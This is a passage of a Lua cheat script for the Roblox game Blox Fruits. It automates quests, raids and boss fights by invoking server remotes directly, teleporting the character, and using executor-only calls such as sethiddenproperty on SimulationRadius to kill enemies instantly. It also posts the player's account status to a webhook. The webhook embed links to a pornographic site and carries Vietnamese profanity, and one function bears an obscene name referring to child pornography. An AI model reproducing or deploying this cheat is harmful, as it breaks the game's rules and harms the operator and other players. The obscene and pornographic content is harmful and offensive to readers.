                           game:GetService("Players").LocalPlayer,
                           "SimulationRadius",
                           math.huge)
                           v.Humanoid.Health = 0
                           v:BreakJoints()
                           end
                                                      end )
                                                      
                                                      end
                                           until not game.Workspace.Enemies:FindFirstChild"Heaven's Guardian [Lv. 2200] [Boss]" 
                   
                                            wait(.2) 
                                                      to(game:GetService("Workspace").Map.HeavenlyDimension.Exit.CFrame)
                                                                end 
                                                                end 
                 end
             elseif CheckMaterialCount"Alucard Fragment" == 6 then
                 return {
                   0,
                   0,
                   "Done"
                 }
               
               end
               else 
                 if a.Mastery > 350 and not 
                 CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") and c()["Process"]["Hop For Rip Indra"] then 
                  
                   hophophop = true
                   return
                 end 
               
                 set1"Waiting For Tushita" 
                 if not checkitem2"Tushita" and checkitem"Tushita" then
                 set1"Waiting For Tushita Hit 300 Mastery" 
                 forcewp = "Sword"
                 local args = {
    [1] = "LoadItem",
    [2] = "Tushita"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))

                 end
        end
             else
             forcewp = "Sword" 
             set1"Waiting For  Yama"
             if not checkitem2"Yama" and checkitem"Yama" then
             set1"Waiting For Yama Hit 300 Mastery"
             local args = {
    [1] = "LoadItem",
    [2] = "Yama"
}

game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end 
           end
     end
     
end
      
           task.spawn(function()
            RedeemAllCodesX2()
            end)
            function noti2(msg)
               if msg ~= oldmsg then
                  -- noti(msg, 5)
                  WeaponMsg = msg
                  oldmsg = msg
               end
            end
            
            function noti(b, d)
              
               Notify(
               {
                  Description = b,
                  Title = "Heiskso • notifications",
                  Duration = d or 5
               }
               )
            end
            local blocked = {}

            function getElite()
               for v746, v9471 in pairs(getsortedmon()) do
                  if skidymf(v9471) and table.find(elite, v9471.Name) then
                     return v9471
                  end
               end
               for v746, v9471 in pairs(game.ReplicatedStorage:GetChildren()) do
                  if skidymf(v9471) and table.find(elite, v9471.Name) then
                     return v9471
                  end
               end
            end

            eltrul = {}

         
            allmelee = " > "
            for v09, v10 in pairs(meleetable2) do
              local cu = GetAndCheckMeleeMastery(v10)
               eltrul[v10] = cu or 0
               print(v09,v10,cu)
               allmelee = allmelee.." "..tostring(v10).."("..tostring(GetAndCheckMeleeMastery(v10))..")"
               pcall(function () if cu == 0 then return end vclui[v10]:SetText("[+] : "..v10) end)
            end
            
            CFrameQuest()
            wait()
            
            PullFruit = false
            delaychecktime = 0
          function checkdelay(task, oldt) 
            delaychecktime = delaychecktime+1
            
           
    
           delaytime = tick()
            
          end
              function AwakeFruit()

        local cI = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")

        if not cI or cI == 0 or cI == 1 then
            return
        end
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
    end
      
      function getAwakeningSkills() 
        local awakened = ""
        if not game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") then 
          return "This Fruit Cant Awaken"
          end
        for i, v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")) do 
           awakened = awakened.." ["..i.."]: "..tostring(v.Awakened)..", " 
        end 
        return awakened
      end 
      
      function getAwakeningSkills2() 
        
        if not game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") then 
          return {["This Fruit Cant Awaken"] = false}
        end
        local ban = {}
        for i, v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities")) do 
            ban[tostring(i)] = v.Awakened or false
        end 
        return ban
      end 
   function getChildPorn() 
     local bucac = {}
     for i, v in pairs(inv) do 
       if tonumber(v.Rarity) > 2 then 
         table.insert(bucac, v.Name)
       end 
     end 
     return bucac 
   end 
   noti("Loaded ("..math.floor(tick()-tickcac).."ms delay)")
if c().Misc.Webhook.Enable then 
  warn("ok")
  spawn(function () 
    fe = true
    while (fe and wait()) or task.wait(c().Misc.Webhook["Send While"].Delay) do 
      fe = false
      if c().Misc.Webhook["Send While"]["Account Status"] then 
        noti("Post Account Status To Webhook...")
        warn("post")
        local inventory = {
          Sword = " > ",
          Gun = " > ",
          Wear = " > ",
          ["Blox Fruit"] = " > ",
          Material = " > ",
          Other = " > "
        }
        for k, v in pairs(inv) do 
         v.Type = v.Type or "Other"
         
          print(v.Type)
          if string.len(inventory[v.Type]) > 1000 then inventory[v.Type]=tostring(inventory[v.Type].."..." )
            else
          inventory[v.Type] = tostring(inventory[v.Type]..v.Name.."("..(v.Mastery or v.Count or "?")..")("..tostring(rarity[v.Rarity] or "null")..") ")
          end
        --setclipboard(tostring(game:GetService"HttpService":JSONEncode(inventory)))
        end
        allmelee = " > "
        for l, j in pairs(eltrul) do 
          if j > 0 then 
            allmelee = allmelee.." "..tostring(l).."("..tostring(j)..")," 
          end 
        end
       
        ditmemememememmeme = {}
        ditmemememememmeme["embeds"] = {{
          ["title"] = "Cai Dit Con Me May Beo",
          ["url"] = "https://thumbzilla.com/",
          ["description"] = "Dit Me May Ong",
          ["color"] = 14177041,
          ["image"] = {
            ["url"] = c().Misc.Webhook.Image[math.random(1, #c().Misc.Webhook.Image)]
          },
          ["author"] = {
            ["name"] = "Teus",
            ["icon_url"] = ""
          },
          ["fields"] = {
            {
              ["name"] = "General",
              ["value"] = tostring("```Name: "..game.Players.LocalPlayer.Name.."\nLevel: "..getPlayerLevel().."\nBeli: "..getPlayerBeli().."\nFragments: "..getPlayerFragments().."\nRace: "..whatismyrace().."\nDevil Fruit: "..tostring(NameDf()).."```"),
              ["inline"] = true
            },
          
            {
              ["name"] = "Melee",
              ["value"] = "```"..tostring(allmelee or "Error").."```",
              ["inline"] = true
            },
             {
              ["name"] = "Awakening Skills",
              ["value"] = "```"..tostring(getAwakeningSkills()).."```",
              ["inline"] = true
            },
            
            {
              ["name"] = "Sword",
              ["value"] = "```"..tostring(inventory["Sword"]or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Gun",
              ["value"] = "```"..tostring(inventory["Gun"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Accessory",
              ["value"] = "```"..tostring(inventory["Wear"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Fruit",
              ["value"] = "```"..tostring(inventory["Blox Fruit"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Material",
              ["value"] = "```"..tostring(inventory["Material"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Others",
              ["value"] = "```"..tostring(inventory["Other"] or "Error").."```",
              ["inline"] = true
            },
            {
              ["name"] = "Unlocked",
              ["value"] = "```"..tostring("Race V2: "..tostring(moctui(2)).."\nRace V3: "..tostring(moctui(3)).."\nBartilo: "..tostring(BartiloProgress == 3).."\nSwan: "..tostring( uable["FlamingoAccess"] or false)).."```",
              ["inline"] = true
            },
           
           
             {
               ["name"] = "Script Status",
               ["value"] = "```"..(m1 or "none").."\n "..(m2 or "none").."```",
               ["inline"] = true
             },
          },
          ["footer"] = {
             ["text"] = "Bản Hack Kaitun Dành Cho Mấy Thằng Cụt Tay / "..disp_time(esltime) or "",
           },
        
           ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
           }}
         
      PostWebhook(c().Misc.Webhook.Url, ditmemememememmeme)
      
      end
end end) 
end

      
          spawn(function ()
            while task.wait(.1) do 
              pcall(function()
                textframefffff.Text = "Hold P To Remove Black Screen \n Player Level: "..getPlayerLevel()
                if game.Players.LocalPlayer.Character.Humanoid.Sit then
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                  end
              end)
              pcall(function () 
                if c().Process["Auto Buy 3 Legendary Sword"] then
                local args = {

                            [1] = "LegendarySwordDealer",

                            [2] = tostring (math.random(1,3))
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end 
                      if c().Process["Auto Buy Haki Color"] then 
                        local args = {

					[1] = "ColorsDealer",

					[2] = "2"
				}
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                        end 
                end)
              pcall(function() 
                aD = CheckIsRaiding() 
              end) 
              pcall(function() 
                cockboss = CheckSea(3) and CheckBoss(DoughBoss[1]) or CheckBoss(DoughBoss[2])
              end) 
              pcall(function() 
                bA = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", true)
                
              end) 
              pcall(function() 
                specb = getSpeficalBoss()
              end) 
              pcall(function() 
                tushitareq = CheckSea(3) and not checkitem"Tushita" and CheckBoss"rip_indra True Form [Lv. 5000] [Raid Boss]" 
              end) 
              
              pcall(function() 
                checkyamareq = CheckSea(3) and not checkitem"Yama" and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter","Progress") >= 30 
              end) 
              
              pcall(function() 
                buddyreq = CheckSea(3) and not checkitem"Buddy Sword" and CheckBoss"Cake Queen [Lv. 2175] [Boss]"  
              end) 
              
              pcall(function() 
               Canvanderreq = CheckSea(3) and CheckBoss"Beautiful Pirate [Lv. 1950] [Boss]" and not checkitem"Canvander" 
              end) 
              
              pcall(function() 
                 hakicol = CheckSea(3) and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan","Bet") == nil 
              end) 
              
              pcall(function() 
                ispirateraid = getMobPirateRaid()
              end) 
              
              pcall(function() 
                tushitareq2 = CheckSea(3) and not checkitem"Tushita"and not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") and CheckBoss"Longma [Lv. 2000] [Boss]" 
              end) 
              
              pcall(function() 
                librarydoor = CheckSea(2) and checkitem"Library Key" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency == 0  
              end) 
              
              pcall(function() 
                 rengokustat = CheckSea(2) and checkitem"Hidden Key" and not checkitem"Rengoku"
              end) 
              
              pcall(function() 
                 factoryexists = CheckSea(2) and
                 
                 
                 (getmon("Core") or CheckBoss"Core")
              end) 
              
              pcall(function() 
                BartiloProgress = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" )
              end) 
              
              pcall(function() 
                zqp = game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("ZQuestProgress", "Check")
              end) 
              
              pcall(function() 
                uable = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables") 
               uable = uable or {}
              end) 
              
              pcall(function() 
                waterkeystuff = CheckSea(2) and not cls_7 and CheckBoss"Tide Keeper [Lv. 1475] [Boss]"
              end) 
              
              pcall(function() 
                rengokustat3 = CheckSea(2) and (not checkitem"Rengoku" or (game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor".Transparency == 0))
                and CheckBoss"Awakened Ice Admiral [Lv. 1400] [Boss]" 
                
              end) 
              
              pcall(function() 
                cls_1 =  not CheckSea(1) and (( aD or AutoRaid ) and (game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", (SelectRaid or getraidchip())) == 1 or (PullFruit and loadfruit(getRaidFruit()) and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", (SelectRaid or getraidchip())) == 1) or CheckIsRaiding()))or checkitem"Special Microchip" 
              end) 
              
              spawn(function() 
                cls_2 = CheckSea(3) and checkitem"Red Key" and game:GetService("Workspace").Map.CakeLoaf:FindFirstChild("RedDoor") 
              end) 
              
            
          
              pcall(function()
                cls_3 = checkitem"Hallow Essence" 
                end)
              pcall(function()
                cls_4 = CheckSea(2) and getPlayerLevel() > 849 and BartiloProgress and BartiloProgress~= 3 and deobietsettengi() and c().Process.Bartilo
                end)
              pcall(function()
                cls_5 = getElite() 
                end)
              pcall(function()
                cls_6 =  (workspace:FindFirstChild"Flower2" and workspace.Flower2.Transparency ~= 1 and not checkitem"Flower 2")
                end)
              pcall(function()
                cls_7 = CheckWaterKey()
                end)
           
            end 
          end)
          
          spawn(function ()
            while task.wait() do
              
             oti = tick()
           
              oldtimetime = os.time() 
              ayuu, miii = xpcall(function ()
              spawn(function()
                  pcall(function () 
                if CheckMaterialCount("Bone") > 50 then 
                   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1) 
                   end
                    end)
              reach = os.time()
             
               updatetime()
            
             end)
--           --    warn(PullFruit, AutoRaid, CheckIsRaiding())
         delaytime = tick() 
             
               if getgenv().ForceStop  then 
                  
             --   elseif  CheckSea(3) and cdkstuff1()  then 
                 elseif  cls_1 then
                   set"Raiding"
                   noti"Raid"
                   if CheckIsRaiding()  then
                     rson = "Continue Raid" 
                   end 
                   if AutoRaid  then 
                     rson = "Request Raid" 
                   end
                               --     noti("Auto Raid / "..getdelaytime.." / "..rson)
                    if CheckIsRaiding()  then
                     AutoRaid = false
                     PullFruit = false
                  repeat wait()
                        pcall(function()
                      for i, v in pairs(getsortedmon()) do 
                        to(getNextIsland().CFrame*CFrame.new(math.random(0,50),100,math.random(0,50)))
                             v.HumanoidRootPart.CanCollide = false
                           sethiddenproperty(
                             game:GetService("Players").LocalPlayer,
                             "SimulationRadius",
                             math.huge)
                             v.Humanoid.Health = 0
                             v:BreakJoints()
                      end 
                        end) 
          
                      until not CheckIsRaiding()
                else
                if CheckSea(3)  then
                             fireclickdetector(Workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
  
                          elseif  CheckSea(2)  then
                             fireclickdetector(Workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                          else
                           lp:Kick("Bro What?")
                          end
                        check179 = os.time()
                        repeat wait() pcall(function ()sexroblox:Cancel()end) to(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame) print("?") until checkNotify("GO") or not game.Players.LocalPlayer.Character:FindFirstChild"Head" or os.time()-check179 > 10
                        
                   end 
                  AwakeFruit()
                elseif  cls_2 then 
                  EquipWeaponName"Red Key"
                  to(CFrame.new(-2681.97998, 64.3921585, -12853.7363, 0.149007782, -1.87902192e-08, 0.98883605, 3.60619588e-08, 1, 1.35681812e-08, -0.98883605, 3.36376011e-08, 0.149007782)) 
                  local args = {
 									[1] = "CakeScientist",
 									[2] = "Check"
 								}
 
 								game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))    
 								local args = {
 									[1] = "RaidsNpc",
 									[2] = "Check"
 								}
 
 								game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))     
 								
                elseif  CheckSea(3) and (cockboss)  then 
                  local ayuyu = CheckBoss(DoughBoss[1]) or CheckBoss(DoughBoss[2]) 
                  click = true
                  repeat wait() 
                    pcall(function ()
                      to(ayuyu.HumanoidRootPart.CFrame*CFrame.new(5,35,8))
                      stuff(ayuyu)
                    end) 
                  until not skidymf(ayuyu)
                  click = false
                  
                elseif  CheckSea(3) and bA == 4  then 
                  game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start") 
                  wait() 
                  request(Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125))
            
                     
                elseif  cls_3 then 
                   to(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
                   elseif   CheckSea(3) and CheckBoss"Soul Reaper [Lv. 2100] [Raid Boss]"  then
                      local ter = CheckBoss"Soul Reaper [Lv. 2100] [Raid Boss]"
                      set("Feeding "..ter.Name.." [Hallow Scythe]")
                      repeat wait()
                         pcall(function ()
                         to(ter.HumanoidRootPart.CFrame*CFrame.new(3,40,7))
                         click = true
                         stuff(ter)
                         end)
                      until not skidymf(ter)







  






                   elseif   CheckSea(3) and buddyreq  then
                      local ter = CheckBoss"Cake Queen [Lv. 2175] [Boss]"
                      set("Feeding "..ter.Name.." [Buddy Sword]")
                      repeat wait()
                         pcall(function ()
                         to(getKillVector3(ter.HumanoidRootPart.CFrame))
                         click = true
                         stuff(ter)
                         end)
                      until not skidymf(ter)
 
                   elseif  CheckSea(3) and checkyamareq  then
                      set("Get Yama")
                      repeat wait()
                         fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                      until checkitem"Yama"
 
                   elseif  CheckSea(3) and tushitareq  then
                      set"Doing Holy Torch Quest"
                      if not EquipWeaponName"Holy Torch"  then
                         to(CFrame.new(-10752, 417, -9366))
                      else
                         repeat wait()
                            to(CFrame.new(-10752.7695, 412.229523, -9366.36328))
                            wait(.2)
                            to(CFrame.new(-11673.4111, 331.749023, -9474.34668))
                            wait(.2)
                            to(CFrame.new(-12133.3389, 519.47522, -10653.1904))
                            wait(.2)
                            to(CFrame.new(-13336.5, 485.280396, -6983.35254, 0.912677109))
                            wait(.2)
                            to(CFrame.new(-13487.4131, 334.84840, -7926.34863))
                            wait(.4)
                         until not checkitem"Holy Torch"
                      end
     elseif   specb  then
                   if CheckIsRaiding()  then
                      game.Players.LocalPlayer.Character.Humanoid.Health = -2
                   else  
                      local ngbthemcac = getSpeficalBoss()
                      set("Farming Boss: "..ngbthemcac.Name)
                      if ngbthemcac  then
                         repeat wait ()
                            pcall(function ()
                            to(getKillVector3(ngbthemcac.HumanoidRootPart.CFrame))
                            stuff(ngbthemcac)
                            click = true
                            end)
                         until not skidymf(ngbthemcac)
                      end
                   end
                
                   elseif  CheckSea(3) and tushitareq2  then
                      local eltrulngum = CheckBoss"Longma [Lv. 2000] [Boss]"
                      set("Farming "..eltrulngum.Name.." [Tushita]")
                      repeat wait()
                         pcall(function()
                         to(getKillVector3(eltrulngum.HumanoidRootPart.CFrame))
                         stuff(eltrulngum)
                         click = true
                         end)
                      until not skidymf(eltrulngum)
                      click= false
                   

                   elseif   CheckSea(3) and ispirateraid  then
                     check180 = os.time()
                  repeat wait()
                     local terungungungungungungu = getMobPirateRaid()
                     set("Pirate Raid")
                     repeat wait()
                        pcall(function ()
                        to(getKillVector3(terungungungungungungu.HumanoidRootPart.CFrame))
                        stuff ()
                        click = true
                        end)
                     until not skidymf(terungungungungungungu)
                     click = false
                  until checkNotify"job" or os.time()-check180 > 200
                   
                  elseif   CheckSea(3) and hakicol  then
                     set"Doing Rainbow Haki Quest"
                     if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible  then
                       if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone")  then
                        if not CheckBoss"Stone [Lv. 1550] [Boss]"  then
                           HopServer() wait(9999)
                        end

                        local bulon = CheckBoss"Stone [Lv. 1550] [Boss]"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(bulon.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(bulon)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Empress")  then
                        if not CheckBoss"Island Empress [Lv. 1675] [Boss]"  then
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Island Empress [Lv. 1675] [Boss]"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo")  then
                        if not CheckBoss"Kilo Admiral [Lv. 1750] [Boss]"  then
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Kilo Admiral [Lv. 1750] [Boss]"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Elephant")  then
                        if not CheckBoss"Captain Elephant [Lv. 1875] [Boss]"  then
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Captain Elephant [Lv. 1875] [Boss]"
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful")  then
                        if not CheckBoss"Beautiful Pirate [Lv. 1950] [Boss]"  then
                          noti"Hop For Beautiful Pirate"
                           HopServer() wait(9999)
                        end
                        eltrulngu = CheckBoss"Beautiful Pirate [Lv. 1950] [Boss]" 
                   
                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                           click= true
                           stuff ()
                           end)
                        until not skidymf(eltrulngu)
                        click = false
                     end
                     else
                       game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan","Bet")
                     end 
                
                  elseif CheckSea(3) and cls_5 then
                     eltrulngungungu = getElite()
                     set("Farming Elite: "..eltrulngungungu.Name)
                     if eltrulngungungu  then
                        if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible  then

                           if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                           eltrulngungungu.Name:gsub(" %pLv. %d+%p", ""))   then
                              
                              repeat wait()
                                 pcall(function()
                                 to(getKillVector3( eltrulngungungu.HumanoidRootPart.CFrame))
                                 click = true
                                 stuff(eltrulngungungu)
                                 end)
                              until not skidymf(eltrulngungungu)
                              click = false
                           else
                           
                              game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                            
                           end

                        else
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
                        end
                     end
                  elseif  CheckSea(3) and Canvanderreq  then
                     local ter = CheckBoss"Beautiful Pirate [Lv. 1950] [Boss]"
                     set("Farming "..ter.Name.." [Canvander]")
                     repeat wait()
                        pcall(function ()
                        to(getKillVector3(ter.HumanoidRootPart.CFrame))
                        click = true
                        stuff(ter)
                        end)
                     until not skidymf(ter)
          
               elseif  cls_4  then
                  
                  set"Doing Bartilo Quest"
                  if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" ) == 0  then
                     if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == true  then

                        if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan") and string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50")  then
                           set("Doing Bartilo Quest 1: Killing 50x Swan Pirate")
                           pcall(function ()to(getMobLoadPos("Swan Pirate")*CFrame.new(0,50,5))end)
                           for i, v in pairs(getsortedmon()) do
                              if v.Name == "Swan Pirate [Lv. 775]"  then
                                 repeat wait()
                                    pcall(function ()
                                    to(getKillVector3(v.HumanoidRootPart.CFrame))
                                    stuff(v)
                                    BringMobChoosen = v
                                    BringMob(v)
                                    click = true
                                    end)
                                 until not skidymf(v)
                                 click = false
                              end
                           end
                        else
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                          
                        end
                     else
                        local args = {[1] = "StartQuest", [2] = "BartiloQuest", [3] = 1}

                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                     end
                  elseif  BartiloProgress == 1  then
                     set"Doing Bartilo Quest 2: Killing Jeremy [Boss]"
                     local v84 = CheckBoss("Jeremy [Lv. 850] [Boss]")


                     if v84  then


                        repeat wait()
                           pcall(function ()
                           to(getKillVector3(v84.HumanoidRootPart.CFrame))
                           stuff(v84)
                           click = true
                           end)
                        until not skidymf(v84)
                        click = false
                     end
                  elseif   game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress","Bartilo" ) == 2  then
                     set("Doing Bartilo Quest 3: (sugget this quest name plz)")
                     if (CFrame.new(-1837.46155,44.2921753,1656.1987,0.999881566,-1.03885048e-22,-0.0153914848,1.07805858e-22,1,2.53909284e-22,0.0153914848,-2.55538502e-22,0.999881566).Position-game.Players.LocalPlayer.Character.Head.Position).magnitude > 500  then
                        to(CFrame.new(-1837.46155,44.2921753,1656.1987,0.999881566,-1.03885048e-22,-0.0153914848,1.07805858e-22,1,2.53909284e-22,0.0153914848,-2.55538502e-22,0.999881566))
                     else


                        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =

                        CFrame.new(-1836, 11, 1714)
                        wait(.5)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1850.49329, 13.1789551, 1750.89685)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1858.87305, 19.3777466, 1712.01807)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1803.94324, 16.5789185, 1750.89685)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1858.55835, 16.8604317, 1724.79541)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1869.54224, 15.987854, 1681.00659)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1800.0979, 16.4978027, 1684.52368)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1819.26343, 14.795166, 1717.90625)
                        wait(1)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                        CFrame.new(-1813.51843, 14.8604736, 1724.79541)
                     end



                  end
                  
              elseif   CheckSea(3) and CheckMaterialCount("Conjured Cocoa") < 10 and not checkitem"Sweet Chalice" and not checkitem"Mirror Fractal"  then
                  local vinhbeo = {"Chocolate Bar Battler [Lv. 2325]","Cocoa Warrior [Lv. 2300]"}
                  set("Farmimg Until Conjured Cocoa Hit 10x ["..CheckMaterialCount("Conjured Cocoa").."/10]")
                  for vdjsbxhw, fjwjsnnd in pairs(vinhbeo) do
                     if not getmon(fjwjsnnd)  then
                        pcall(function () to(getMobLoadPos(fjwjsnnd:gsub(" %pLv. %d+%p", ""))*CFrame.new(0,80,0)) end)
                     else
                        for bu, lon in pairs(getsortedmon()) do
                           if lon.Name == fjwjsnnd  then
                            
                                 
                                 
                                 click = true
                                   BringMob(lon)
                              repeat wait()
                                 pcall(function()
                                 to(getKillVector3(lon.HumanoidRootPart.CFrame))
                                 stuff ()
                                 end)
                              until not skidymf(lon)
                           end
                        end
                     end
                  end
        
               elseif   CheckSea(2) and factoryexists  then
                  
                  set"Feeding Factory"
                  local v72 = getmon"Core" or CheckBoss"Core"
                  if v72  then
                     repeat wait()
                        pcall(function ()
                        to(v72.HumanoidRootPart.CFrame)
                        click= true
                        stuff(v72)

                        end)

                     until not skidymf(v72)
                     factoryexists = false
                  end
                  storefruit()
               elseif  CheckSea(2) and rengokustat  then
                  set"Using Hidden Key For Rengoku"
                  to(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                  EquipWeaponName"Hidden Key"
               elseif  CheckSea(2) and librarydoor  then
                  set"Using Library Key For Phoeyu"
                  to(CFrame.new(6376.93164, 296.760071, -6843.54932, -0.906182051, -1.26464874e-08, -0.422887832, -7.46116324e-09, 1, -1.39169662e-08, 0.422887832, -9.45606971e-09, -0.906182051))
               elseif  CheckSea(2) and not cls_7 and checkitem"Water Key"   then
                  set"Using Water Key For Daigrock"
                  buyMelee"SharkmanKarate"
                  -- elseif  print"ok27" and CheckSea(2) and ((checkitem("Hidden Key")and not checkitem"Rengoku") or (checkitem("Library Key") and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild"PhoeyuDoor" and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency == 0 ) or (checkitem"Water Key"and not cls_7 ))  then
                  --       print"key"
                  --       if checkitem("Library key")  then
                  --         to(CFrame.new(6376.93164, 296.760071, -6843.54932, -0.906182051, -1.26464874e-08, -0.422887832, -7.46116324e-09, 1, -1.39169662e-08, 0.422887832, -9.45606971e-09, -0.906182051))
                  --         if (CFrame.new(6376.93164, 296.760071, -6843.54932, -0.906182051, -1.26464874e-08, -0.422887832, -7.46116324e-09, 1, -1.39169662e-08, 0.422887832, -9.45606971e-09, -0.906182051).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3  then
                  --                                 wait(1.2)
                  --                                 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep",true)
                  --                                 game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                  --                                 wait(0.5)
                  --         end
                  --                           elseif  checkitem("Hidden Key")  then
                  --        to(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                  --       EquipWeaponName"Hidden Key"
                  --                           elseif  checkitem"Water Key"  then
                  --              buyMelee"SharkmanKarate"
                  --       end
               
                 
elseif CheckSea(3) and c().Process['Soul Guitar'] and not checkitem"Soul Guitar" and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")  == nil and game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
set("Soul Guitar Start Quest [Dialoguing Gravestone]")
  if  game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")  == nil then
